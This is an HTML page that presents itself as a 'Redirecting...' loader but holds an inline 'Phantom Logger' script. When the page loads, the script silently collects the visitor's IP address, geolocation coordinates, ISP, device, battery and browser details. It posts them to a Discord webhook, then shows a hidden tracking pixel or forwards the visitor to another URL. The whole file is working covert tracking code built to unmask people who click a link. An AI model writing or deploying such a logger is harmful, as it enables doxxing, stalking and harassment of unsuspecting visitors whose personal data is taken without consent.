<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body { 
            background: #0a0a0f; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0;
            font-family: system-ui, -apple-system, sans-serif;
            color: white;
        }
        .loader {
            width: 20px;
            height: 20px;
            border: 2px solid #a78bfa;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        img[width="1"] { display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        (async function() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            const type = params.get('type');
            const redirect = params.get('redirect');
            
            // Get webhook from localStorage (stored when link was generated)
            const webhookUrl = localStorage.getItem('phantom_webhook');
            
            if (webhookUrl) {
                // Helper to get browser name from User Agent
                const getBrowserName = (userAgent) => {
                    if (!userAgent) return "Unknown";
                    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
                    if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
                    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
                    if (userAgent.includes("Trident")) return "Internet Explorer";
                    if (userAgent.includes("Edge") || userAgent.includes("Edg")) return "Microsoft Edge";
                    if (userAgent.includes("Chrome")) return "Google Chrome";
                    if (userAgent.includes("Safari")) return "Apple Safari";
                    return "Unknown";
                };

                // Collect data
                const data = {
                    id: id,
                    type: type,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer || 'direct',
                    cookiesEnabled: navigator.cookieEnabled,
                    cpuCores: navigator.hardwareConcurrency || 'N/A',
                    browser: getBrowserName(navigator.userAgent)
                };
                
                // Get Battery Info
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        data.batteryLevel = `${Math.round(battery.level * 100)}%`;
                        data.batteryCharging = battery.charging ? 'Yes' : 'No';
                    }
                } catch (e) {}

                // Get IP and extended location info
                try {
                    const ipRes = await fetch('https://ipapi.co/json/');
                    if (ipRes.ok) {
                        const ipData = await ipRes.json();
                        data.ip = ipData.ip;
                        data.ip_version = ipData.version;
                        data.city = ipData.city;
                        data.region = ipData.region;
                        data.country = ipData.country_name;
                        data.latitude = ipData.latitude;
                        data.longitude = ipData.longitude;
                        data.isp = ipData.org;
                        data.asn = ipData.asn;
                    }
                } catch (e) {}
                
                // Send to Discord with a much more advanced embed
                try {
                    const embed = {
                        title: "👻 Phantom Logger | New Visit",
                        description: `A new visit has been recorded for tracking ID \`${id || 'N/A'}\`.`,
                        color: 0xa78bfa,
                        fields: [
                            {
                                name: "🌐 Network Information",
                                value: `**IP Address:** \`${data.ip || 'Unknown'}\` (${data.ip_version || '?'})\n` +
                                       `**ISP:** ${data.isp || 'Unknown'}\n` +
                                       `**ASN:** ${data.asn || 'Unknown'}`,
                                inline: false
                            },
                            {
                                name: "📍 Geolocation",
                                value: `**Location:** ${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}\n` +
                                       (data.latitude && data.longitude ? `**Coordinates:** View on Map\n` : '') +
                                       `**Timezone:** ${data.timezone || 'Unknown'}`,
                                inline: false
                            },
                            {
                                name: "💻 Device & Browser",
                                value: `**Device:** ${data.platform || 'Unknown'}\n` +
                                       `**Screen:** ${data.screen || 'Unknown'}\n` +
                                       `**Browser:** ${data.browser || 'Unknown'}\n` +
                                       `**Language:** ${data.language || 'Unknown'}`,
                                inline: true
                            },
                            {
                                name: "🔧 System & Capabilities",
                                value: `**CPU Cores:** ${data.cpuCores || 'N/A'}\n` +
                                       `**Cookies:** ${data.cookiesEnabled ? 'Enabled' : 'Disabled'}\n` +
                                       (data.batteryLevel ? `**Battery:** ${data.batteryLevel} (${data.batteryCharging === 'Yes' ? 'Charging' : 'Discharging'})\n` : '') +
                                       `**Referrer:** \`${data.referrer || 'direct'}\``,
                                inline: true
                            }
                        ],
                        footer: {
                            text: `User Agent: ${data.userAgent}`
                        },
                        timestamp: new Date().toISOString()
                    };

                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ embeds: [embed] })
                    });
                } catch (e) {}
            }
            
            // Handle based on type
            if (type === 'image') {
                // Serve 1x1 pixel
                const img = new Image();
                img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
                img.width = 1;
                img.height = 1;
                img.style.display = 'none';
                document.body.appendChild(img);
                document.body.innerHTML = '<!-- 1x1 pixel -->';
            } else if (type === 'link' && redirect) {
                // Redirect after 1 second
                setTimeout(() => {
                    window.location.href = decodeURIComponent(redirect);
                }, 1000);
            } else {
                document.body.innerHTML = 'Redirecting...';
            }
        })();
    </script>
</body>
</html>
